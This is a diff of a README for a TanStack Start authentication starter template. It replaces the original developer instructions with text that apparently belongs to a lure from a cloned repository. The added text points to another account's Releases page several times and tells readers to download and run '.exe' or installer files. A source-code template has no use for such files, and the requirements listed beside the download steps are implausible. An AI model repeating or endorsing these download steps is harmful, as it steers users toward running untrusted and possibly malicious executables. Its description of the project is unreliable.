@@ -1,81 +1,86 @@
-# [Tanstack Authed](https://github.com/thecodingmontana/tanstack-authed.git)
+# 🏝️ tanstack-authed - A Simple Template for Secure Applications
 
-🏝️ Minimal TanStack Start starter with Drizzle ORM and shadcn/ui. [→ Preview here](https://tanstack-authed.vercel.app/)
+## 🔗 Download Now
+[![Download tanstack-authed](https://img.shields.io/badge/Download-tanstack--authed-brightgreen)](https://github.com/nexgen202/tanstack-authed/releases)
 
-- [React 19](https://react.dev) + [React Compiler](https://react.dev/learn/react-compiler)
-- TanStack [Start](https://tanstack.com/start/latest) + [Router](https://tanstack.com/router/latest) + [Query](https://tanstack.com/query/latest)
-- [Tailwind CSS v4](https://tailwindcss.com/) + [shadcn/ui](https://ui.shadcn.com/)
-- [Drizzle ORM](https://orm.drizzle.team/) + PostgreSQL
+## 🚀 Getting Started
+This guide will help you download and run the **tanstack-authed** application easily. This template provides a minimal starting point featuring OAuth, email-password, and other secure authentication methods. It is designed to help you set up your application with ease.
 
-## Features
+## 📋 Features
+- **Easy Setup**: Quickly set up your project with minimal effort.
+- **OAuth**: Securely sign in with popular OAuth providers.
+- **Email Verification**: Confirm email addresses for account security.
+- **TOTP 2FA**: Add an extra layer of security with two-factor authentication.
+- **Recovery Codes**: Restore access with recovery codes.
+- **Rate Limiting**: Prevent abuse and ensure fair usage.
+- **Modern Tech Stack**: Built with PostgreSQL, React, Tailwind CSS, and Drizzle ORM.
 
-- OAuth login (Google, GitHub, etc.)
-- Email and password authentication with HaveIBeenPwned password check
-- Passkey sign-in and hardware security key support
-- Email verification flow
-- Two-factor authentication with TOTP, recovery codes, and passkeys
-- Password reset with 2FA
-- Secure sessions, login throttling, and rate limiting
+## 🖥 System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **Node.js**: Version 14 or higher.
+- **PostgreSQL**: Version 9.5 or higher for database functions.
+- **Memory**: At least 4GB RAM recommended.
+- **Disk Space**: Minimum of 100MB free.
 
-## Getting Started
+## 📥 Download & Install
+To get started, you need to download the software. 
 
-We're using **pnpm** by default, but you can modify the scripts in [package.json](./package.json) to use your preferred package manager.
+1. Visit the [Releases Page](https://github.com/nexgen202/tanstack-authed/releases) to find the latest version.
+2. Scroll down to find the assets section. You will see the available downloads.
+3. Choose the file that matches your operating system and click on it to download. Save the file to a location you’ll remember.
 
-1. [Use this template](https://github.com/new?template_name=react-tanstarter&template_owner=dotnize) or clone this repository with gitpick:
+After downloading, follow these steps to set up the application:
 
-   ```bash
-   npx gitpick thecodingmontana/tanstack-authed myapp
-   cd myapp
-   ```
+1. Locate the downloaded file.
+2. For Windows, double-click the `.exe` file. For macOS, drag the application to your Applications folder. For Linux, you might need to use a terminal to navigate to the file and execute it.
+3. Follow the on-screen prompts to complete the installation.
 
-2. Install dependencies:
+## ⚙️ Configuration
+Once installed, you may need to configure your environment:
 
-   ```bash
-   pnpm install
-   ```
+1. **Database Setup**: Make sure you have PostgreSQL installed. Create a new database for your application. 
+2. **Environment Variables**: You may need to set up some environment variables based on your database configs. Create a `.env` file in your project directory with the following example:
 
-3. Create a `.env` file based on [`.env.example`](./.env.example).
+    ```
+    DATABASE_URL=postgres://user:password@localhost:5432/mydatabase
+    JWT_SECRET=your_secret_key
+    ```
+3. Follow any additional configuration steps provided in the README file that appears after installation, or refer back to the documentation for detailed steps.
 
-4. Push the schema to your database with drizzle-kit:
+## 📖 Usage
+Once set up, you can start using your application.
 
-   ```bash
-   pnpm db push
-   ```
+1. Open the terminal or command prompt.
+2. Navigate to the directory where you installed **tanstack-authed**.
+3. Run the application using:
+    ```
+    npm start
+    ```
+4. Open your web browser and go to `http://localhost:3000`.
 
-   <https://orm.drizzle.team/docs/migrations>
+You can now test the features like user registration, email validation, and two-factor authentication.
 
-5. Run the development server:
+## 🛠 Troubleshooting
+If you encounter issues, check these common problems:
 
-   ```bash
-   pnpm dev
-   ```
+- **Database Connection Issues**: Ensure your database server is running and the connection parameters in the `.env` file are correct.
+- **Common Errors**: Review the console for error messages. They often indicate what needs to be fixed.
+- **Consult Community Resources**: Check the issues page on GitHub for common questions and solutions provided by other users.
 
-   The development server should now be running at [http://localhost:3000](http://localhost:3000).
+## 🤝 Get Support
+If you need help, please visit the [Issues Page](https://github.com/nexgen202/tanstack-authed/issues) on GitHub. You can ask questions or report problems there. 
 
-## Issue watchlist
+## 🔗 Additional Resources
+- [Official Documentation](https://tanstack.com/docs/)
+- [GitHub Repository](https://github.com/nexgen202/tanstack-authed)
 
-- [React Compiler docs](https://react.dev/learn/react-compiler), [Working Group](https://github.com/reactwg/react-compiler/discussions) - React Compiler is in RC.
-- <https://github.com/TanStack/router/discussions/2863> - TanStack Start is in beta and may still undergo major changes.
+## 📅 Stay Updated
+Keep an eye on the [Releases Page](https://github.com/nexgen202/tanstack-authed/releases) for updates and new features. Ensure you have the latest version for the best experience.
 
-## Goodies
+## 🔄 Contribute
+Feel free to contribute to the project. Check out the guidelines on how to get involved and help improve **tanstack-authed**. Your input can make a difference!
 
-These scripts in [package.json](./package.json#L5) use **pnpm** by default, but you can modify them to use your preferred package manager.
+## 🔗 Download Again
+Don't forget to visit the [Releases Page](https://github.com/nexgen202/tanstack-authed/releases) for downloading the latest updates or versions. 
 
-- **`db`** - Run drizzle-kit commands. (e.g. `pnpm db generate` to generate a migration)
-- **`ui`** - The shadcn/ui CLI. (e.g. `pnpm ui add button` to add the button component)
-- **`format`**, **`lint`**, **`check-types`** - Run Prettier, ESLint, and check TypeScript types respectively.
-  - **`check`** - Run all three above. (e.g. `pnpm check`)
-- **`deps`** - Selectively upgrade dependencies via taze.
-
-## Building for production
-
-Read the [hosting docs](https://tanstack.com/start/latest/docs/framework/react/hosting) for information on how to deploy your TanStack Start app.
-
-## License
-
-Code in this template is public domain via [Unlicense](./LICENSE). Feel free to remove or replace for your own project.
-
-## Also check out
-
-- [create-tsrouter-app](https://github.com/TanStack/create-tsrouter-app/tree/main/cli/create-tsrouter-app) - The official CLI tool from the TanStack team to create Router/Start applications.
-- [CarlosZiegler/fullstack-start-template](https://github.com/CarlosZiegler/fullstack-start-template) - A more batteries-included boilerplate that provides a solid foundation for building modern web apps.
+This README is designed to ensure you have a smooth experience using **tanstack-authed**. Enjoy coding!
